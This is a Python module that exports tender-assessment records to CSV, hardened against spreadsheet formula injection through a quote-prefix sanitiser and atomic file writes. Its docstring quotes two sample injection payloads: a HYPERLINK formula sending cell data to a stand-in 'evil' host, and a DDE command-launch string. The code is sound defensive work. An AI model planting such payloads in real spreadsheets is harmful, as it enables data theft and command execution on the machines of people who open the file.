"""
CSV export for opportunity assessments, hardened against CSV/formula injection.

Threat: tender documents and LLM output are untrusted. A value such as
``=HYPERLINK("http://evil/?"&A1)`` or ``@SUM(1+1)*cmd|' /C calc'!A0`` is
executed as a formula when a reviewer opens the CSV in Excel/LibreOffice/
Google Sheets. Following OWASP guidance, any text cell that begins with a
formula trigger character is prefixed with a single quote so spreadsheet
apps render it as literal text.
"""

from __future__ import annotations

import csv
import io
import os
import tempfile
from collections.abc import Iterable
from pathlib import Path
from typing import Any

from .schemas import OpportunityAssessment

# Characters that make spreadsheet apps treat a cell as a formula.
# '=', '+', '-', '@' are the classic triggers; TAB and CR are included per
# OWASP because some apps strip them and then evaluate what follows.
FORMULA_TRIGGERS: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")

# Fixed column order: stable output makes diffs and downstream parsing easy.
CSV_COLUMNS: list[str] = [
    "opportunity_id",
    "title",
    "buyer",
    "submission_deadline",
    "decision_status",
    "decision_reasons",
    "evaluated_at",
    "requirement_id",
    "requirement_description",
    "is_mandatory",
    "gate_result",
    "confidence",
    "evidence",
    "notes",
]


def sanitize_csv_field(value: Any) -> Any:
    """Neutralise a single cell value against formula injection.

    - ``None`` becomes an empty string.
    - Real numbers/bools are returned unchanged: they are written as numeric
      literals, cannot carry a payload, and keeping them unquoted means a
      genuine negative number like -5 stays numeric.
    - Everything else is converted to ``str``; if it starts with a trigger
      character it is prefixed with ``'`` so it is displayed as text.
    """
    if value is None:
        return ""
    if isinstance(value, (bool, int, float)):
        return value

    text = str(value)
    if text.startswith(FORMULA_TRIGGERS):
        return "'" + text
    return text


def _format_evidence(evidence: Iterable[Any]) -> str:
    """Flatten evidence references into one compact, human-readable cell."""
    parts = []
    for ev in evidence:
        location = ev.document_id
        if ev.page is not None:
            location += f" p.{ev.page}"
        if ev.section:
            location += f" §{ev.section}"
        parts.append(location)
    return "; ".join(parts)


def assessments_to_rows(assessments: Iterable[OpportunityAssessment]) -> list[dict[str, Any]]:
    """Flatten assessments into one row per requirement (unsanitised).

    Opportunity-level fields are repeated on every row so each row is
    self-contained when filtered in a spreadsheet. An opportunity with no
    requirements still produces one row so its decision is not lost.
    """
    rows: list[dict[str, Any]] = []
    for a in assessments:
        base = {
            "opportunity_id": a.opportunity_id,
            "title": a.title,
            "buyer": a.buyer,
            "submission_deadline": a.submission_deadline.isoformat() if a.submission_deadline else None,
            "decision_status": a.decision_status.value,
            "decision_reasons": " | ".join(a.decision_reasons),
            "evaluated_at": a.evaluated_at.isoformat(),
        }
        if not a.requirements:
            rows.append({**base, **{col: None for col in CSV_COLUMNS if col not in base}})
            continue
        for req in a.requirements:
            rows.append(
                {
                    **base,
                    "requirement_id": req.requirement_id,
                    "requirement_description": req.description,
                    "is_mandatory": req.is_mandatory,
                    "gate_result": req.gate_result.value,
                    "confidence": req.confidence,
                    "evidence": _format_evidence(req.evidence),
                    "notes": req.notes,
                }
            )
    return rows


def _write_rows(handle: Any, rows: Iterable[dict[str, Any]]) -> None:
    """Write header + sanitised rows to an open text handle."""
    # QUOTE_MINIMAL handles commas, quotes and newlines inside values;
    # sanitisation handles formula triggers. Both are needed.
    writer = csv.DictWriter(handle, fieldnames=CSV_COLUMNS, quoting=csv.QUOTE_MINIMAL, extrasaction="raise")
    writer.writeheader()
    for row in rows:
        writer.writerow({col: sanitize_csv_field(row.get(col)) for col in CSV_COLUMNS})


def assessments_to_csv_string(assessments: Iterable[OpportunityAssessment]) -> str:
    """Render assessments as a sanitised CSV string (e.g. for an HTTP response)."""
    buffer = io.StringIO(newline="")
    _write_rows(buffer, assessments_to_rows(assessments))
    return buffer.getvalue()


def export_assessments_to_csv(
    assessments: Iterable[OpportunityAssessment],
    output_path: str | os.PathLike[str],
) -> Path:
    """Write assessments to a CSV file atomically and return its path.

    The file is written to a temporary file in the same directory and then
    moved into place with ``os.replace``, so readers never see a partially
    written file and a crash mid-export leaves any previous file intact.

    Encoding is UTF-8 with BOM (``utf-8-sig``) so Excel detects it correctly
    and non-ASCII buyer names/descriptions are not garbled.
    """
    target = Path(output_path).resolve()
    target.parent.mkdir(parents=True, exist_ok=True)
    rows = assessments_to_rows(assessments)

    fd, tmp_name = tempfile.mkstemp(prefix=f".{target.name}.", suffix=".tmp", dir=target.parent)
    try:
        with os.fdopen(fd, "w", encoding="utf-8-sig", newline="") as handle:
            _write_rows(handle, rows)
            handle.flush()
            os.fsync(handle.fileno())
        os.replace(tmp_name, target)
    except BaseException:
        # Clean up the temp file on any failure, then re-raise.
        try:
            os.unlink(tmp_name)
        except FileNotFoundError:
            pass
        raise
    return target
